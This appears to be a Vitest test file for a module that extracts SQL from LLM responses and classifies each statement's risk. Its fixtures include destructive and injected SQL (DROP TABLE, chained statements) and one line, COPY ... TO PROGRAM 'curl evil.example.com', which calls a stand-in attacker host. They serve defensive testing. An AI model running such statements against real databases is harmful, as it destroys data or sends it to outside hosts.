// @vitest-environment node
import type { Engine } from '@strata/contracts'
import { describe, expect, it } from 'vitest'
import { classifySql, extractSql } from './sql-output'

const run = (raw: string, engine: Engine = 'sqlite') => classifySql(engine, extractSql(raw))

describe('extractSql', () => {
  it('deja intacto un SQL limpio', () => {
    expect(extractSql('SELECT id FROM users')).toEqual({
      text: 'SELECT id FROM users',
      warnings: [],
    })
  })

  it('quita el bloque <think> de Qwen3, también con mayúsculas y varios', () => {
    const raw =
      '<think>\nEl usuario quiere contar filas... SELECT 999\n</think>\n\nSELECT count(*) FROM users'
    expect(extractSql(raw)).toEqual({
      text: 'SELECT count(*) FROM users',
      warnings: ['reasoning_removed'],
    })
    expect(extractSql('<THINK>a</THINK>SELECT 1<think>b</think>').text).toBe('SELECT 1')
    expect(extractSql('<thinking>a</thinking>\nSELECT 1').text).toBe('SELECT 1')
  })

  it('un <think> sin cerrar (respuesta cortada) descarta hasta el final y no deja SQL', () => {
    const extracted = extractSql('<think>\nPensando en DROP TABLE users; y mas')
    expect(extracted.text).toBe('')
    expect(extracted.warnings).toEqual(['reasoning_removed'])
    expect(() => classifySql('sqlite', extracted)).toThrow()
  })

  it('un cierre </think> huérfano descarta lo anterior (plantillas que abren el bloque en el prompt)', () => {
    expect(extractSql('razonamiento suelto\n</think>\nSELECT 1').text).toBe('SELECT 1')
  })

  it('el SQL que aparece dentro del razonamiento no se cuela', () => {
    const raw = '<think>DELETE FROM users;</think>SELECT 1'
    expect(extractSql(raw).text).toBe('SELECT 1')
  })

  it.each([
    ['```sql\nSELECT 1\n```', 'SELECT 1'],
    ['```SQL\nSELECT 1\n```', 'SELECT 1'],
    ['```\nSELECT 1\n```', 'SELECT 1'],
    ['```postgresql\nSELECT 1;\n```', 'SELECT 1;'],
    ['```sql\nSELECT 1', 'SELECT 1'],
    ['Aquí tienes:\n\n```sql\nSELECT 1\n```\n\nEsto devuelve uno.', 'SELECT 1'],
    ['```sql SELECT 1```', 'SELECT 1'],
  ])('quita las vallas de código: %j', (raw, expected) => {
    const extracted = extractSql(raw)
    expect(extracted.text).toBe(expected)
    expect(extracted.warnings).toContain('formatting_removed')
  })

  it('con varias vallas toma la primera de SQL e ignora otras del resto (json, etc.)', () => {
    const raw = '```json\n{"a":1}\n```\n```sql\nSELECT 1\n```\n```sql\nDROP TABLE t\n```'
    expect(extractSql(raw).text).toBe('SELECT 1')
  })

  it('quita la prosa antes de la sentencia', () => {
    const extracted = extractSql(
      'Claro, esta es la consulta que necesitas:\nSELECT name FROM users',
    )
    expect(extracted.text).toBe('SELECT name FROM users')
    expect(extracted.warnings).toEqual(['formatting_removed'])
  })

  it('quita la prosa después, separada por una línea en blanco, con o sin punto y coma', () => {
    expect(extractSql('SELECT 1;\n\nThis query returns one row.').text).toBe('SELECT 1;')
    expect(extractSql('SELECT 1\n\nNote: the result has a single column.').text).toBe('SELECT 1')
    expect(extractSql('SELECT 1\n\n**Explicación:** devuelve uno').text).toBe('SELECT 1')
    expect(extractSql('SELECT 1\n\n1. Devuelve uno').text).toBe('SELECT 1')
  })

  it('no confunde una frase que empieza por «With» con una CTE, pero sí reconoce una CTE real', () => {
    expect(extractSql('With this query you get all users:\nSELECT * FROM users').text).toBe(
      'SELECT * FROM users',
    )
    expect(extractSql('WITH recent AS (SELECT 1) SELECT * FROM recent').text).toBe(
      'WITH recent AS (SELECT 1) SELECT * FROM recent',
    )
  })

  it('mantiene una sentencia con líneas en blanco internas cuando el resto sigue siendo SQL', () => {
    const sql = 'WITH a AS (SELECT 1),\n\nb AS (SELECT 2)\nSELECT * FROM a, b'
    expect(extractSql(sql).text).toBe(sql)
  })

  it('no toca los identificadores entre comillas invertidas de una sentencia', () => {
    const sql = 'SELECT `first name` FROM `users`'
    expect(extractSql(sql)).toEqual({ text: sql, warnings: [] })
  })

  it('desenvuelve una sentencia entera entre comillas invertidas simples', () => {
    expect(extractSql('`SELECT 1`').text).toBe('SELECT 1')
  })
})

describe('classifySql: una sola sentencia', () => {
  it('quita el punto y coma final y devuelve el texto de la sentencia', () => {
    expect(run('SELECT * FROM users;')).toMatchObject({ sql: 'SELECT * FROM users' })
  })

  it.each([
    'SELECT 1; SELECT 2',
    'SELECT 1;\nDELETE FROM users;',
    'SELECT 1; DROP TABLE users',
    'SELECT * FROM t; INSERT INTO t VALUES (1)',
    'BEGIN; DELETE FROM t; COMMIT',
  ])('rechaza varias sentencias: %j', (sql) => {
    for (const engine of ['sqlite', 'postgres'] as const) {
      expect(() => run(sql, engine)).toThrowError(
        expect.objectContaining({
          normalized: expect.objectContaining({ code: 'validation_failed' }),
        }),
      )
    }
  })

  it('un punto y coma dentro de una cadena o de un comentario no cuenta como otra sentencia', () => {
    expect(run("SELECT 'a;b' AS x").sql).toBe("SELECT 'a;b' AS x")
    expect(run('SELECT 1 -- ; DROP TABLE t').risk).toBe('read')
    expect(run('SELECT 1 /* ; DROP TABLE t */').risk).toBe('read')
  })

  it('descarta como prosa lo que sigue si no parece SQL, y lo avisa', () => {
    const result = run('SELECT 1; This returns one row.')
    expect(result.sql).toBe('SELECT 1')
    expect(result.warnings).toContain('formatting_removed')
  })

  it.each([
    'Lo siento, no sé qué quieres decir con eso.',
    "I'm sorry, I can't help with that.",
    'GARBAGE STATEMENT HERE',
    '¿Puedes explicarlo mejor?',
    '42',
    '<think>x</think>\nNo tengo información para eso.',
  ])(
    'rechaza como validation_failed un texto que no es una sentencia, sin repetirlo: %j',
    (raw) => {
      for (const engine of ['sqlite', 'postgres'] as const) {
        let thrown: unknown
        try {
          run(raw, engine)
        } catch (reason) {
          thrown = reason
        }
        expect(thrown, `${engine}: ${raw}`).toMatchObject({
          normalized: {
            code: 'validation_failed',
            message: 'The model did not produce a SQL statement',
          },
        })
        expect(JSON.stringify(thrown)).not.toContain(raw.slice(0, 12))
      }
    },
  )

  it('una sentencia de dos fases de PostgreSQL que el analizador no modela también se rechaza', () => {
    expect(() => run("COMMIT PREPARED 'tx1'", 'postgres')).toThrowError(
      expect.objectContaining({
        normalized: expect.objectContaining({ code: 'validation_failed' }),
      }),
    )
  })

  it('rechaza un texto vacío o solo comentarios como validation_failed', () => {
    for (const raw of ['', '   ', '/* nada */', '<think>x</think>']) {
      expect(() => run(raw), raw).toThrowError(
        expect.objectContaining({
          normalized: expect.objectContaining({ code: 'validation_failed' }),
        }),
      )
    }
  })

  it.each([
    '-- CANNOT_ANSWER',
    '--CANNOT_ANSWER\n',
    'CANNOT_ANSWER',
    '```sql\n-- CANNOT_ANSWER\n```',
    '<think>no hay tabla</think>\n-- cannot_answer',
  ])('distingue la respuesta -- CANNOT_ANSWER con su propio código: %j', (raw) => {
    for (const engine of ['sqlite', 'postgres'] as const) {
      expect(() => run(raw, engine)).toThrowError(
        expect.objectContaining({
          normalized: expect.objectContaining({ code: 'cannot_answer', retryable: false }),
        }),
      )
    }
  })

  it('una sentencia válida que menciona CANNOT_ANSWER en una cadena sigue siendo SQL', () => {
    expect(run("SELECT 'CANNOT_ANSWER' AS x").risk).toBe('read')
  })

  it('rechaza una sentencia demasiado larga', () => {
    expect(() => run(`SELECT '${'x'.repeat(21_000)}'`)).toThrow()
  })

  it('los errores no citan el SQL ni la respuesta del modelo', () => {
    let thrown: unknown
    try {
      run('SELECT secret_token FROM t; SELECT 2')
    } catch (reason) {
      thrown = reason
    }
    expect(JSON.stringify(thrown)).not.toContain('secret_token')
  })
})

describe('classifySql: riesgo', () => {
  const cases: readonly [string, string, string, string][] = [
    ['SELECT * FROM users', 'read', 'query', 'select'],
    ['WITH a AS (SELECT 1) SELECT * FROM a', 'read', 'query', 'cte de lectura'],
    ['VALUES (1), (2)', 'read', 'query', 'values'],
    ['EXPLAIN SELECT * FROM users', 'read', 'query', 'explain'],
    ["INSERT INTO users (name) VALUES ('a')", 'write', 'dml', 'insert'],
    ["UPDATE users SET name = 'a' WHERE id = 1", 'write', 'dml', 'update con where'],
    ['DELETE FROM users WHERE id = 1', 'write', 'dml', 'delete con where'],
    ['CREATE TABLE t (a int)', 'write', 'ddl', 'create'],
    ['CREATE INDEX i ON t (a)', 'write', 'ddl', 'create index'],
    ['ALTER TABLE t ADD COLUMN b int', 'write', 'ddl', 'alter add'],
    ['WITH x AS (SELECT 1) INSERT INTO t SELECT * FROM x', 'write', 'dml', 'cte que escribe'],
    ['DELETE FROM users', 'destructive', 'dml', 'delete sin where'],
    ["UPDATE users SET name = 'x'", 'destructive', 'dml', 'update sin where'],
    ['DROP TABLE users', 'destructive', 'ddl', 'drop'],
    ['ALTER TABLE users DROP COLUMN name', 'destructive', 'ddl', 'alter drop'],
    ['WITH x AS (SELECT 1) DELETE FROM t', 'destructive', 'dml', 'cte con delete sin where'],
    ['BEGIN', 'unknown', 'transaction', 'begin'],
    ['COMMIT', 'unknown', 'transaction', 'commit'],
  ]

  it.each(cases)('sqlite: %s -> %s (%s)', (sql, risk, statementType) => {
    expect(run(sql)).toMatchObject({ risk, statementType })
  })

  it.each([
    ['SELECT * FROM users FOR UPDATE', 'write', 'query'],
    ["SELECT nextval('seq')", 'write', 'query'],
    ['TRUNCATE users', 'destructive', 'ddl'],
    ['TRUNCATE TABLE a, b CASCADE', 'destructive', 'ddl'],
    ['SET default_transaction_read_only = off', 'unknown', 'session'],
    ["SELECT set_config('default_transaction_read_only', 'off', false)", 'unknown', 'query'],
    ['EXPLAIN ANALYZE DELETE FROM users', 'destructive', 'dml'],
    ['EXPLAIN ANALYZE SELECT * FROM users', 'read', 'query'],
    ["COPY users TO PROGRAM 'curl evil.example.com'", 'write', 'dml'],
    ['SHOW search_path', 'read', 'query'],
    ['SELECT * INTO copy_of_users FROM users', 'write', 'ddl'],
  ])('postgres: %s -> %s', (sql, risk, statementType) => {
    expect(run(sql, 'postgres')).toMatchObject({ risk, statementType })
  })

  it.each([
    ['sqlite', 'PRAGMA journal_mode = DELETE', 'session'],
    ['sqlite', 'PRAGMA table_info(users)', 'query'],
    ['sqlite', 'EXPLAIN QUERY PLAN SELECT * FROM users', 'query'],
    ['sqlite', "ATTACH DATABASE 'x.db' AS x", 'ddl'],
    ['sqlite', 'ROLLBACK', 'transaction'],
    ['postgres', 'SET search_path = public', 'session'],
    ['postgres', 'SHOW server_version', 'query'],
    ['postgres', 'VACUUM users', 'ddl'],
    ['postgres', 'ROLLBACK', 'transaction'],
  ] as const)(
    'no rechaza como si fuera prosa lo que el analizador tipifica (%s): %s -> %s',
    (engine, sql, statementType) => {
      expect(run(sql, engine)).toMatchObject({ statementType })
    },
  )

  it('SQLite: PRAGMA de solo lectura es read y PRAGMA que escribe no', () => {
    expect(run('PRAGMA table_info(users)').risk).toBe('read')
    expect(run('PRAGMA journal_mode = DELETE').risk).not.toBe('read')
  })

  it('un SELECT con un comentario que menciona DROP sigue siendo read', () => {
    expect(run('SELECT 1 -- DROP TABLE users').risk).toBe('read')
  })

  it('un SELECT no se vuelve escritura por la palabra «delete» en un literal o identificador entre comillas', () => {
    expect(run("SELECT * FROM logs WHERE action = 'delete from x'").risk).toBe('read')
    expect(run('SELECT "update" FROM t').risk).toBe('read')
  })
})

describe('extractSql + classifySql con respuestas realistas', () => {
  it('Qwen3 con razonamiento, valla y explicación', () => {
    const raw = `<think>
Necesito contar pedidos por cliente. Uso GROUP BY.
</think>

\`\`\`sql
SELECT c.name, COUNT(o.id) AS orders
FROM customers c
JOIN orders o ON o.customer_id = c.id
GROUP BY c.name
ORDER BY orders DESC;
\`\`\`

Esta consulta cuenta los pedidos de cada cliente.`
    const result = run(raw)
    expect(result.risk).toBe('read')
    expect(result.warnings.sort()).toEqual(['formatting_removed', 'reasoning_removed'])
    expect(result.sql).toContain('GROUP BY c.name')
    expect(result.sql).not.toContain('Esta consulta')
    expect(result.sql.endsWith(';')).toBe(false)
  })

  it('una inyección de prompt que consigue que el modelo emita un DROP se etiqueta destructive; escondido tras un SELECT, se rechaza', () => {
    expect(run('DROP TABLE users;').risk).toBe('destructive')
    expect(() => run('SELECT 1; DROP TABLE users;', 'postgres')).toThrow()
  })
})

describe('classifySql: prosa que empieza con un comando SQL', () => {
  const prose = [
    'Do you mean the total per customer?',
    'Do you want me to filter by date?',
    '¿Do you mean users? Please clarify.',
    'Set it to zero.',
    'Show me the users table.',
    'Show me the users',
    'Call me if you need more details.',
    'Vacuum the table first.',
    'Grant access to the admin group.',
    'Revoke access from the guest users.',
    'Analyze the results and tell me what you see.',
    'Commit to the plan and see.',
    'Begin by telling me which table.',
    'Comment on the previous answer, please.',
    'Execute the query yourself!',
    'Explain the query in more detail.',
    'Reset the password?',
    'Copy the file to stdout.',
    'Table of contents.',
    'End of the story.',
    'Release the kraken!',
    '¿Quieres que filtre por fecha? Set the date',
    'Do you mean… ¿los pedidos de este mes?',
  ]

  it.each(prose)('postgres: rechaza %j', (text) => {
    expect(() => run(text, 'postgres')).toThrow()
  })

  it.each(prose)('sqlite: rechaza %j', (text) => {
    expect(() => run(text, 'sqlite')).toThrow()
  })

  it.each([
    ['DO $$ BEGIN PERFORM 1; END $$', 'DO $$'],
    ['DO LANGUAGE plpgsql $$ BEGIN NULL; END $$', 'DO LANGUAGE'],
    ["DO 'BEGIN NULL; END'", "DO '...'"],
    ['CALL refresh_stats(1)', 'CALL'],
    ['CALL app.refresh_stats()', 'CALL calificado'],
    ['SET search_path = public', 'SET ='],
    ['SET statement_timeout TO 5000', 'SET TO'],
    ["SET LOCAL timezone TO 'UTC'", 'SET LOCAL'],
    ["SET TIME ZONE 'UTC'", 'SET TIME ZONE'],
    ['SET ROLE reporting', 'SET ROLE'],
    ['SHOW search_path', 'SHOW'],
    ['SHOW ALL', 'SHOW ALL'],
    ['SHOW TIME ZONE', 'SHOW TIME ZONE'],
    ['SHOW transaction isolation level', 'SHOW isolation'],
    ['VACUUM', 'VACUUM solo'],
    ['VACUUM users', 'VACUUM tabla'],
    ['VACUUM (FULL, ANALYZE) public.users', 'VACUUM opciones'],
    ['VACUUM FULL VERBOSE users', 'VACUUM FULL'],
    ['ANALYZE users (name)', 'ANALYZE'],
    ['GRANT SELECT ON users TO reporting', 'GRANT privilegios'],
    ['GRANT SELECT, INSERT ON ALL TABLES IN SCHEMA public TO app', 'GRANT all tables'],
    ['GRANT admins TO alice', 'GRANT rol'],
    ['REVOKE SELECT ON users FROM reporting', 'REVOKE privilegios'],
    ['REVOKE admins FROM alice', 'REVOKE rol'],
    ["COMMENT ON TABLE users IS 'clientes'", 'COMMENT'],
    ['REFRESH MATERIALIZED VIEW mv', 'REFRESH'],
    ['RESET search_path', 'RESET'],
    ['DISCARD ALL', 'DISCARD'],
    ['BEGIN', 'BEGIN'],
    ['BEGIN TRANSACTION ISOLATION LEVEL SERIALIZABLE', 'BEGIN isolation'],
    ['START TRANSACTION READ ONLY', 'START'],
    ['COMMIT', 'COMMIT'],
    ['END', 'END'],
    ['ROLLBACK TO SAVEPOINT sp1', 'ROLLBACK TO'],
    ['SAVEPOINT sp1', 'SAVEPOINT'],
    ['RELEASE SAVEPOINT sp1', 'RELEASE'],
    ["EXECUTE plan1(1, 'a')", 'EXECUTE'],
    ['COPY users TO STDOUT', 'COPY'],
    ["COPY (SELECT 1) TO '/tmp/x.csv'", 'COPY consulta'],
    ['MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE', 'MERGE'],
    ['TABLE users', 'TABLE'],
    ['VALUES (1), (2)', 'VALUES'],
    ['REINDEX TABLE users', 'REINDEX'],
    ['CLUSTER users USING users_pkey', 'CLUSTER'],
    ['EXPLAIN SELECT 1', 'EXPLAIN'],
    ['EXPLAIN (ANALYZE) SELECT 1', 'EXPLAIN opciones'],
    ['-- nota\nSET search_path = public', 'SET tras comentario'],
  ] as const)('postgres: acepta SQL legítimo %j (%s)', (sql: string, label: string) => {
    expect(run(sql, 'postgres').sql, label).toBeTruthy()
  })

  it.each([
    'PRAGMA table_info(users)',
    'PRAGMA journal_mode = WAL',
    'PRAGMA main.user_version',
    'VACUUM',
    "VACUUM INTO 'copia.db'",
    "ATTACH DATABASE 'x.db' AS x",
    'DETACH DATABASE x',
    'BEGIN IMMEDIATE',
    'COMMIT',
    'ROLLBACK',
    'EXPLAIN QUERY PLAN SELECT * FROM users',
    'REPLACE INTO t (a) VALUES (1)',
    'REINDEX users',
    'ANALYZE',
    'SAVEPOINT a',
    'RELEASE a',
  ])('sqlite: acepta SQL legítimo %j', (sql) => {
    expect(run(sql, 'sqlite').sql).toBeTruthy()
  })
})
